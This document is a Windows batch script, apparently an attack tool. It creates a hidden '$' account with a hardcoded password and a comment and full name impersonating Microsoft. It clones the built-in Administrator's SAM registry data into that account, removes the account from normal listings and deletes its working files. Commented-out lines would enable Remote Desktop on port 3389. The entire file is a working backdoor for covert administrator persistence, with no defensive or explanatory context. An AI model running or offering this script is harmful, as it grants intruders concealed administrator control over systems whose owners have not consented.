@echo off
set user=godpock$
set buser=Administrator
set ridkey=HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
net user  godpock$  Tianyu1314 /add  /COMMENT:"这是一个帮助和支持服务的提供商帐户"  /FULLNAME:"CN=Microsoft Corporation,L=Redmond,S=Washington"
reg export HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\godpock$ godpock$.reg
for /f "tokens=2 delims=()" %%i in ('find /i "@=HEX" godpock$.reg') do set userrid=%%i
reg export HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\00000%userrid% %userrid%.reg
reg export HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\%buser% %buser%$.reg
for /f "tokens=2 delims=()" %%i in ('find /i "@=HEX" %buser%$.reg') do set buserrid=%%i
reg export HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001f4 1f4.reg
for /f "skip=6 delims=()" %%o in ('find /i "," %userrid%.reg') do @echo %%o >>%user%-last.reg
@echo Windows Registry Editor Version 5.00 >%user%-first.reg
@echo.>>%user%-first.reg
@echo [HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\00000%userrid%] >>%user%-first.reg
for /f "skip=2 delims=()" %%q in ('find "," 1f4.reg') do @echo %%q >>systemreg001.reg
set /p a=<systemreg001.reg
@echo %a:~0% >>%user%-first.reg
for /f "skip=2 delims=()" %%o in ('find /v "%a:~4%" systemreg001.reg') do @echo %%o >>systemreg002.reg
del /q systemreg001.reg
set /p a=<systemreg002.reg
@echo %a:~0% >>%user%-first.reg
for /f "skip=2 delims=()" %%o in ('find /v "%a:~4%" systemreg002.reg') do @echo %%o >>systemreg003.reg
del /q systemreg002.reg
set /p a=<systemreg003.reg
@echo %a:~0% >>%user%-first.reg
for /f "skip=2 delims=()" %%o in ('find /v "%a:~4%" systemreg003.reg') do @echo %%o >>systemreg004.reg
del /q systemreg003.reg
set /p a=<systemreg004.reg
@echo %a:~0% >>%user%-first.reg
del /q systemreg004.reg
type %user%-last.reg >>%user%-first.reg
net user godpock$ /del
regedit /s %user%-first.reg
regedit /s godpock$.reg
del /q %user%-first.reg
del /q %user%-last.reg
del /q %user%.reg
del /q %userrid%.reg
del /q %buser%$.reg
del /q 1f4.reg

rem @echo Windows Registry Editor Version 5.00>%SystemRoot%/3389.reg
rem @echo.>>%SystemRoot%/3389.reg
rem @echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server]>>%SystemRoot%/3389.reg
rem @echo "fDenyTSConnections"=dword:00000000>>%SystemRoot%/3389.reg
rem @echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/Wds/rdpwd/Tds/tcp]>>%SystemRoot%/3389.reg
rem @echo "PortNumber"=dword:00000d3d>>%SystemRoot%/3389.reg
rem @echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/WinStations/RDP-Tcp]>>%SystemRoot%/3389.reg
REM @echo "PortNumber"=dword:00000d3d>>%SystemRoot%/3389.reg
REM regedit /s %SystemRoot%/3389.reg
REM del %SystemRoot%/3389.reg
rem ping -n 88000000000 127.0.0.1 > nul
